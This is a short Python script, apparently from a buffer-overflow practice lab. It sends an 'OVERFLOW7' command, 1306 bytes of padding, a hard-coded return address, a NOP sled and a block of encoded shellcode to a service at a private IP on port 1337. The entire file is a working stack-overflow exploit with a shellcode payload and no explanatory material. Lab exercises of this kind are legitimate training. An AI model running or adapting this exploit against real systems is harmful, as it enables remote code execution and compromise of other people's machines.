import socket, sys, time


ip = '10.0.2.57'	# Change this
port = 1337		# Change this

buffer = b'OVERFLOW7 '
buffer += b'A' * 1306
retn = b'\xaf\x11\x50\x62'
padding = b'\x90' * 16
shellcode =  b""
shellcode += b"\x31\xc9\x83\xe9\xcf\xe8\xff\xff\xff\xff\xc0"
shellcode += b"\x5e\x81\x76\x0e\x73\xa6\xb7\xe5\x83\xee\xfc"
shellcode += b"\xe2\xf4\x8f\x4e\x35\xe5\x73\xa6\xd7\x6c\x96"
shellcode += b"\x97\x77\x81\xf8\xf6\x87\x6e\x21\xaa\x3c\xb7"
shellcode += b"\x67\x2d\xc5\xcd\x7c\x11\xfd\xc3\x42\x59\x1b"
shellcode += b"\xd9\x12\xda\xb5\xc9\x53\x67\x78\xe8\x72\x61"
shellcode += b"\x55\x17\x21\xf1\x3c\xb7\x63\x2d\xfd\xd9\xf8"
shellcode += b"\xea\xa6\x9d\x90\xee\xb6\x34\x22\x2d\xee\xc5"
shellcode += b"\x72\x75\x3c\xac\x6b\x45\x8d\xac\xf8\x92\x3c"
shellcode += b"\xe4\xa5\x97\x48\x49\xb2\x69\xba\xe4\xb4\x9e"
shellcode += b"\x57\x90\x85\xa5\xca\x1d\x48\xdb\x93\x90\x97"
shellcode += b"\xfe\x3c\xbd\x57\xa7\x64\x83\xf8\xaa\xfc\x6e"
shellcode += b"\x2b\xba\xb6\x36\xf8\xa2\x3c\xe4\xa3\x2f\xf3"
shellcode += b"\xc1\x57\xfd\xec\x84\x2a\xfc\xe6\x1a\x93\xf9"
shellcode += b"\xe8\xbf\xf8\xb4\x5c\x68\x2e\xcc\xb6\x68\xf6"
shellcode += b"\x14\xb7\xe5\x73\xf6\xdf\xd4\xf8\xc9\x30\x1a"
shellcode += b"\xa6\x1d\x57\xf8\x59\xac\xdf\x43\xe6\x1b\x2a"
shellcode += b"\x1a\xa6\x9a\xb1\x99\x79\x26\x4c\x05\x06\xa3"
shellcode += b"\x0c\xa2\x60\xd4\xd8\x8f\x73\xf5\x48\x30\x10"
shellcode += b"\xc7\xdb\x86\x5d\xc3\xcf\x80\x73\xa6\xb7\xe5"





payload = buffer + retn + padding + shellcode

try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(5)
        s.connect((ip, port))
        #s.recv(1024)
        print('Sending payload')
        s.send(payload)
        s.recv(1024)
except Exception as e:
    print(e)
    sys.exit(0)
